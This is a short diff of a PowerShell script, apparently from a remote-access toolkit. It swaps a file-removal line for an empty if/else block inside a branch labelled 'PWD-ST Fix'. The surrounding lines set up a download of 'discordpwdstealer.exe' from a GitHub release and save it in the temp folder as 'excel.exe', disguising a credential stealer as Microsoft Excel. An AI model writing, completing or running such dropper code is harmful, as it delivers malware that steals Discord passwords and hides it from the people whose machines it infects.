@@ -396,7 +396,9 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing PWD-ST Fix..."
-	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
+	if ($output -ne $null) {
+	} else {
+    	}
 	$TempDir = [System.IO.Path]::GetTempPath()
 	$output = "$TempDir\excel.exe"
 	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
